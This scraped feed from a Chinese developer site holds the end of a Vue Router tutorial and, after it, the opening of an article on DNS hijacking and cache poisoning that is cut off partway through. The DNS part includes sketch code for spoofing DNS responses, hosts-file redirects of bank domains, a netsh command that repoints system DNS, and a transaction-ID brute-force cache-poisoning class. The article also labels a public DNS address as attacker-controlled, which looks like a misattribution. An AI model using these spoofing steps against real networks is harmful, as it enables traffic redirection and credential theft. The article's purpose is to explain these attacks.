    <span class="hljs-attr">id:</span> <span class="hljs-string">message.id</span>,
    <span class="hljs-attr">title:</span> <span class="hljs-string">message.title</span>
  }
<span class="hljs-string">}"&gt;</span>
  {{<span class="hljs-string">message.title</span>}}
<span class="hljs-string">&lt;/router-link&gt;</span>
</code></pre>
<h3 data-id="heading-11">3.3 Props配置简化参数接收</h3>
<p>Vue Router提供了props配置，可以将路由参数作为组件的props传递，使组件更加独立和可复用。</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">name</span>: <span class="hljs-string">'xiangqing'</span>,
  <span class="hljs-attr">path</span>: <span class="hljs-string">'detail'</span>,
  <span class="hljs-attr">component</span>: <span class="hljs-title class_">Detail</span>,
  
  <span class="hljs-comment">// 第一种写法：props值为对象</span>
  <span class="hljs-attr">props</span>: { <span class="hljs-attr">a</span>: <span class="hljs-number">900</span> }
  
  <span class="hljs-comment">// 第二种写法：props值为布尔值</span>
  <span class="hljs-attr">props</span>: <span class="hljs-literal">true</span>  <span class="hljs-comment">// 将params参数作为props传递</span>
  
  <span class="hljs-comment">// 第三种写法：props值为函数</span>
  <span class="hljs-title function_">props</span>(<span class="hljs-params">route</span>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">id</span>: route.<span class="hljs-property">query</span>.<span class="hljs-property">id</span>,
      <span class="hljs-attr">title</span>: route.<span class="hljs-property">query</span>.<span class="hljs-property">title</span>
    }
  }
}
</code></pre>
<h2 data-id="heading-12">四、编程式路由导航</h2>
<p>除了使用<code>&lt;router-link&gt;</code>进行声明式导航外，Vue Router还提供了编程式导航API，使路由跳转更加灵活。</p>
<h3 data-id="heading-13">4.1 基本导航方法</h3>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// UserMessage.vue中的编程式导航示例</span>
methods: {
  <span class="hljs-title function_ invoke__">pushShow</span>(m) {
    this.<span class="hljs-variable">$router</span>.<span class="hljs-title function_ invoke__">push</span>({
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/home/message/detail'</span>,
      <span class="hljs-attr">query</span>: {
        <span class="hljs-attr">id</span>: m.id,
        <span class="hljs-attr">title</span>: m.title
      }
    })
  },
  <span class="hljs-title function_ invoke__">replaceShow</span>(m) {
    this.<span class="hljs-variable">$router</span>.<span class="hljs-title function_ invoke__">replace</span>({
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/home/message/detail'</span>,
      <span class="hljs-attr">query</span>: {
        <span class="hljs-attr">id</span>: m.id,
        <span class="hljs-attr">title</span>: m.title
      }
    })    
  }
}
</code></pre>
<h3 data-id="heading-14">4.2 历史记录管理</h3>
<p>Vue Router提供了多种历史记录管理方法：</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// UserBanner.vue中的历史记录控制</span>
<span class="hljs-attr">methods</span>: {
  <span class="hljs-title function_">forward</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">forward</span>();
  },
  <span class="hljs-title function_">back</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">back</span>();
  },
  <span class="hljs-title function_">go</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">go</span>(-<span class="hljs-number">2</span>);  <span class="hljs-comment">// 后退两步</span>
  }
}
</code></pre>
<h2 data-id="heading-15">五、高级路由功能</h2>
<h3 data-id="heading-16">5.1 缓存路由组件</h3>
<p>在某些场景下，我们需要保持组件的状态，避免组件在切换时被销毁。Vue Router通过<code>&lt;keep-alive&gt;</code>组件实现路由组件的缓存。</p>
<p>vue</p>
<p>复制下载</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- UserHome.vue中的缓存配置 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">keep-alive</span> <span class="hljs-attr">include</span>=<span class="hljs-string">"UserNews"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">router-view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">keep-alive</span>&gt;</span>
</code></pre>
<p><code>include</code>属性指定需要缓存的组件名称（注意是组件name，不是路由name）。如果需要缓存多个组件，可以使用数组：</p>
<p>vue</p>
<p>复制下载</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">keep-alive</span> <span class="hljs-attr">:include</span>=<span class="hljs-string">"['UserNews', 'UserMessage']"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">router-view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">keep-alive</span>&gt;</span>
</code></pre>
<h3 data-id="heading-17">5.2 组件生命周期扩展</h3>
<p>当使用<code>&lt;keep-alive&gt;</code>缓存组件时，Vue组件会获得两个新的生命周期钩子：</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// UserNews.vue中的生命周期示例</span>
<span class="hljs-title function_">activated</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'UserNews组件被激活了'</span>);
  <span class="hljs-comment">// 启动定时器</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> -= <span class="hljs-number">0.01</span>;
    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> &lt;= <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> = <span class="hljs-number">1</span>;
    }
  }, <span class="hljs-number">16</span>)
},
<span class="hljs-title function_">deactivated</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'UserNews组件被停用了'</span>);
  <span class="hljs-comment">// 清除定时器</span>
  <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span>);
}
</code></pre>
<p>这两个钩子只在被缓存的组件中生效，分别在组件激活和失活时触发，非常适合处理如定时器、事件监听等需要在组件不显示时清理的资源。</p>
<h2 data-id="heading-18">六、路由守卫系统</h2>
<p>路由守卫是Vue Router中用于权限控制和路由拦截的强大功能。</p>
<h3 data-id="heading-19">6.1 全局守卫</h3>
<p>全局守卫作用于所有路由，包括全局前置守卫和全局后置守卫。</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 全局前置守卫</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-comment">// 权限检查示例</span>
  <span class="hljs-keyword">if</span>(to.<span class="hljs-property">meta</span>.<span class="hljs-property">isAuth</span>) {
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">'需要授权才能查看'</span>);
    <span class="hljs-comment">// 可以在这里进行登录检查等操作</span>
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">next</span>();  <span class="hljs-comment">// 放行</span>
  }
});

<span class="hljs-comment">// 全局后置守卫</span>
router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
  <span class="hljs-comment">// 修改页面标题</span>
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span> || <span class="hljs-string">'默认标题'</span>;
});
</code></pre>
<h3 data-id="heading-20">6.2 独享守卫</h3>
<p>独享守卫只作用于特定路由，在路由配置中直接定义：</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">path</span>: <span class="hljs-string">'/about'</span>,
  <span class="hljs-attr">component</span>: <span class="hljs-title class_">UserAbout</span>,
  <span class="hljs-title function_">beforeEnter</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) {
    <span class="hljs-comment">// 进入/about路由前的逻辑</span>
    <span class="hljs-title function_">next</span>();
  }
}
</code></pre>
<h3 data-id="heading-21">6.3 组件内守卫</h3>
<p>组件内守卫定义在组件内部，提供了更细粒度的控制：</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// UserAbout.vue中的组件内守卫</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'UserAbout'</span>,
  
  <span class="hljs-comment">// 进入守卫</span>
  <span class="hljs-title function_">beforeRouteEnter</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) {
    <span class="hljs-comment">// 在渲染该组件的对应路由被验证前调用</span>
    <span class="hljs-comment">// 不能获取组件实例 `this`</span>
    <span class="hljs-title function_">next</span>();
  },
  
  <span class="hljs-comment">// 离开守卫</span>
  <span class="hljs-title function_">beforeRouteLeave</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) {
    <span class="hljs-comment">// 在导航离开该组件的对应路由时调用</span>
    <span class="hljs-comment">// 可以访问组件实例 `this`</span>
    <span class="hljs-title function_">next</span>();
  }
}
</code></pre>
<h2 data-id="heading-22">七、路由模式选择</h2>
<p>Vue Router支持两种路由模式：hash模式和history模式。</p>
<h3 data-id="heading-23">7.1 Hash模式</h3>
<p>Hash模式使用URL的hash部分（#后面的内容）来模拟完整的URL，而不触发页面重新加载。这是Vue Router的默认模式。</p>
<p>特点：</p>
<ul>
<li>兼容性好，支持所有浏览器</li>
<li>不需要服务器端特殊配置</li>
<li>URL中带有#号，不够美观</li>
</ul>
<h3 data-id="heading-24">7.2 History模式</h3>
<p>History模式利用HTML5 History API实现，提供了更清洁的URL。</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-built_in">VueRouter</span>({
  mode: <span class="hljs-string">'history'</span>,  <span class="hljs-comment">// 启用history模式</span>
  routes: [...]
})
</code></pre>
<p>特点：</p>
<ul>
<li>URL更美观，没有#号</li>
<li>需要服务器端配置支持，避免刷新时出现404错误</li>
<li>兼容性相对较差（现代浏览器都支持）</li>
</ul>
<h2 data-id="heading-25">八、项目架构与最佳实践</h2>
<h3 data-id="heading-26">8.1 项目结构组织</h3>
<p>基于提供的代码，我们可以总结出良好的Vue Router项目结构：</p>
<p>text</p>
<p>复制下载</p>
<pre><code class="hljs language-bash" lang="bash">src/
├── components/     <span class="hljs-comment"># 一般组件</span>
│   └── UserBanner.vue
├── pages/         <span class="hljs-comment"># 路由组件</span>
│   ├── UserAbout.vue
│   ├── UserHome.vue
│   ├── UserNews.vue
│   ├── UserMessage.vue
│   └── MessageDetail.vue
├── router/        <span class="hljs-comment"># 路由配置</span>
│   └── index.js
└── App.vue       <span class="hljs-comment"># 根组件</span>
</code></pre>
<h3 data-id="heading-27">8.2 路由配置管理</h3>
<p>对于大型项目，建议将路由配置拆分到多个文件中：</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// router/modules/home.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">path</span>: <span class="hljs-string">'/home'</span>,
  <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/UserHome.vue'</span>),
  <span class="hljs-attr">children</span>: [...]
}

<span class="hljs-comment">// router/index.js</span>
<span class="hljs-keyword">import</span> homeRoutes <span class="hljs-keyword">from</span> <span class="hljs-string">'./modules/home'</span>
<span class="hljs-keyword">import</span> aboutRoutes <span class="hljs-keyword">from</span> <span class="hljs-string">'./modules/about'</span>

<span class="hljs-keyword">const</span> routes = [
  homeRoutes,
  aboutRoutes
]
</code></pre>
<h3 data-id="heading-28">8.3 路由懒加载</h3>
<p>使用Webpack的动态导入语法实现路由懒加载，可以显著提升应用性能：</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-css" lang="css">{
  path: <span class="hljs-string">'/about'</span>,
  component: () =&gt; <span class="hljs-built_in">import</span>(<span class="hljs-comment">/* webpackChunkName: "about" */</span> <span class="hljs-string">'../pages/UserAbout.vue'</span>)
}
</code></pre>
<h2 data-id="heading-29">九、常见问题与解决方案</h2>
<h3 data-id="heading-30">9.1 路由重复点击警告</h3>
<p>当重复点击当前激活的路由链接时，Vue Router会抛出警告。可以通过以下方式解决：</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 方法1：在push时捕获异常</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/path'</span>).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (err.<span class="hljs-property">name</span> !== <span class="hljs-string">'NavigationDuplicated'</span>) {
    <span class="hljs-keyword">throw</span> err
  }
})

<span class="hljs-comment">// 方法2：重写VueRouter原型方法</span>
<span class="hljs-keyword">const</span> originalPush = <span class="hljs-title class_">VueRouter</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">push</span>
<span class="hljs-title class_">VueRouter</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">push</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">location</span>) {
  <span class="hljs-keyword">return</span> originalPush.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, location).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> err)
}
</code></pre>
<h3 data-id="heading-31">9.2 页面滚动行为控制</h3>
<p>Vue Router允许自定义页面滚动行为：</p>
<p>javascript</p>
<p>复制下载</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>({
  <span class="hljs-attr">routes</span>: [...],
  <span class="hljs-title function_">scrollBehavior</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, savedPosition</span>) {
    <span class="hljs-comment">// 返回滚动位置</span>
    <span class="hljs-keyword">if</span> (savedPosition) {
      <span class="hljs-keyword">return</span> savedPosition
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> }
    }
  }
})
</code></pre>
<h2 data-id="heading-32">十、总结</h2>
<p>Vue Router作为Vue.js生态中不可或缺的一部分，为构建复杂的单页应用提供了完整的路由解决方案。从基础的路由配置到高级的守卫系统，从简单的参数传递到复杂的嵌套路由，Vue Router都提供了简洁而强大的API。</p>
<p>通过本文对示例代码的深入分析，我们可以总结出使用Vue Router的最佳实践：</p>
<ol>
<li><strong>合理组织项目结构</strong>：分离路由组件和一般组件，使代码更易维护</li>
<li><strong>合理使用路由参数</strong>：根据场景选择query或params参数传递方式</li>
<li><strong>善用路由守卫</strong>：实现灵活的权限控制和路由拦截</li>
<li><strong>优化组件生命周期</strong>：合理使用缓存和对应的生命周期钩子</li>
<li><strong>考虑路由模式</strong>：根据项目需求选择合适的路由模式</li>
<li><strong>实现代码分割</strong>：使用路由懒加载优化应用性能</li>
</ol>
<p>随着Vue 3的普及，Vue Router 4也带来了更多新特性和改进，但核心概念和设计思想与Vue Router 3保持一致。掌握本文介绍的核心概念和实践技巧，将为开发者构建高效、可维护的Vue.js应用奠定坚实基础。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[DNS安全威胁：从劫持、污染到放大攻击的演练]]></title>    <link>https://juejin.cn/post/7589907831199203354</link>    <guid>https://juejin.cn/post/7589907831199203354</guid>    <pubDate>2026-01-01T10:29:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589907831199203354" data-draft-id="7589839019716542514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="DNS安全威胁：从劫持、污染到放大攻击的演练"/> <meta itemprop="keywords" content="安全,网络协议"/> <meta itemprop="datePublished" content="2026-01-01T10:29:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sweet丶"/> <meta itemprop="url" content="https://juejin.cn/user/3227821869921646"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            DNS安全威胁：从劫持、污染到放大攻击的演练
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821869921646/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sweet丶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T10:29:04.000Z" title="Thu Jan 01 2026 10:29:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>前言：DNS——互联网的“隐形电话簿”</strong></h2>
<p>想象一下，如果没有DNS，访问每个网站都需要记住一串像<code>192.168.1.1</code>这样的数字。DNS让互联网变得人性化，但正是这个每日处理<strong>数千亿次查询</strong>的系统，却成为了网络攻击者的黄金目标。今天，我们将深入探索DNS世界的阴暗面，了解那些威胁我们网络安全的各种攻击手段。</p>
<h2 data-id="heading-1"><strong>一、DNS劫持：当你的导航系统被黑客接管</strong></h2>
<h3 data-id="heading-2"><strong>1.1 什么是DNS劫持？</strong></h3>
<p>DNS劫持就像有人修改了你的GPS导航系统，将“前往银行”的指令变成了“前往黑客的假银行”。</p>
<p><strong>技术原理</strong>：
攻击者通过中间人攻击或恶意软件，篡改DNS响应，将合法域名解析到恶意IP地址。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 攻击者视角的DNS劫持流程</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">dns_hijack_attack</span>():
    <span class="hljs-comment"># 1. 监控网络流量</span>
    sniff_packets(<span class="hljs-built_in">filter</span>=<span class="hljs-string">"udp port 53"</span>)
    
    <span class="hljs-comment"># 2. 拦截DNS查询</span>
    <span class="hljs-keyword">if</span> packet.haslayer(DNS) <span class="hljs-keyword">and</span> packet[DNS].qd.qname == <span class="hljs-string">"bank.com"</span>:
        <span class="hljs-comment"># 3. 伪造响应，指向恶意服务器</span>
        malicious_ip = <span class="hljs-string">"192.168.1.100"</span>
        send_spoofed_response(packet, malicious_ip)
    
    <span class="hljs-comment"># 用户访问bank.com，实际连接到攻击者服务器</span>
</code></pre>
<h3 data-id="heading-3"><strong>1.2 劫持的多种形式</strong></h3>
<h4 data-id="heading-4"><strong>路由器劫持</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 攻击者攻破家用路由器后修改DNS设置</span>
<span class="hljs-comment"># 原始配置：</span>
<span class="hljs-comment"># nameserver 8.8.8.8  # Google DNS</span>

<span class="hljs-comment"># 被篡改后：</span>
<span class="hljs-comment"># nameserver 10.0.0.1  # 攻击者控制的DNS服务器</span>
</code></pre>
<h4 data-id="heading-5"><strong>本地Hosts文件劫持</strong></h4>
<pre><code class="hljs language-plaintext" lang="plaintext"># Windows hosts文件位置：C:\Windows\System32\drivers\etc\hosts
# 恶意软件添加：
192.168.1.100  www.bank.com
192.168.1.100  www.paypal.com
# 所有银行访问都重定向到攻击者服务器
</code></pre>
<h4 data-id="heading-6"><strong>ISP级别的劫持</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 某些ISP会劫持不存在的域名</span>
<span class="hljs-comment">// 用户查询：nonexistent-website.com</span>
<span class="hljs-comment">// 正常响应：NXDOMAIN（域名不存在）</span>
<span class="hljs-comment">// 劫持响应：指向ISP的广告或搜索页面</span>
</code></pre>
<h3 data-id="heading-7"><strong>1.3 真实案例：巴西银行大劫案</strong></h3>
<p><strong>2016年巴西银行攻击</strong>：</p>
<ul>
<li><strong>手法</strong>：恶意软件修改路由器和电脑的DNS设置</li>
<li><strong>目标</strong>：40多家巴西银行</li>
<li><strong>损失</strong>：数百万美元</li>
<li><strong>技术细节</strong>：
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 恶意软件执行的DNS修改</span>
<span class="hljs-keyword">import</span> subprocess

<span class="hljs-comment"># 修改Windows DNS设置</span>
subprocess.run([
    <span class="hljs-string">'netsh'</span>, <span class="hljs-string">'interface'</span>, <span class="hljs-string">'ip'</span>, <span class="hljs-string">'set'</span>, <span class="hljs-string">'dns'</span>,
    <span class="hljs-string">'Ethernet'</span>, <span class="hljs-string">'static'</span>, <span class="hljs-string">'185.228.168.168'</span>
])

<span class="hljs-comment"># 185.228.168.168是攻击者控制的恶意DNS服务器</span>
</code></pre>
</li>
</ul>
<h2 data-id="heading-8"><strong>二、DNS污染：在互联网水源中投毒</strong></h2>
<h3 data-id="heading-9"><strong>2.1 DNS污染的工作原理</strong></h3>
<p>DNS污染又称DNS缓存投毒，攻击者向DNS缓存中注入虚假记录。</p>
<p><strong>攻击时序图</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    用户-&gt;&gt;本地DNS: 查询 evil.com
    本地DNS-&gt;&gt;根服务器: 查询 .com NS
    攻击者-&gt;&gt;本地DNS: 伪造响应(假的权威服务器)
    本地DNS-&gt;&gt;假权威服务器: 查询 evil.com
    假权威服务器-&gt;&gt;本地DNS: 返回恶意IP
    本地DNS-&gt;&gt;用户: 返回恶意IP
    用户-&gt;&gt;恶意网站: 访问 (被攻击)
</code></pre>
<h3 data-id="heading-10"><strong>2.2 技术实现细节</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DNSPoisoningAttack</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_dns_server</span>):
        self.target = target_dns_server
        self.transaction_id = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">65535</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">poison_cache</span>(<span class="hljs-params">self, domain, malicious_ip</span>):
        <span class="hljs-comment"># 关键：预测DNS查询的Transaction ID</span>
        <span class="hljs-keyword">for</span> txid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):
            <span class="hljs-comment"># 伪造权威服务器响应</span>
            spoofed_response = IP(dst=self.target)/UDP(dport=<span class="hljs-number">53</span>)/DNS(
                <span class="hljs-built_in">id</span>=txid,
                qr=<span class="hljs-number">1</span>,  <span class="hljs-comment"># 响应标志</span>
                qd=DNSQR(qname=domain),
                an=DNSRR(rrname=domain, ttl=<span class="hljs-number">86400</span>, rdata=malicious_ip)
            )
            send(spoofed_response)
            
            <span class="hljs-comment"># 同时发送大量查询触发目标DNS的查询</span>
            trigger_query = IP(dst=self.target)/UDP()/DNS(
                <span class="hljs-built_in">id</span>=txid,
                qd=DNSQR(qname=domain)
            )
            send(trigger_query)
</code></pre>
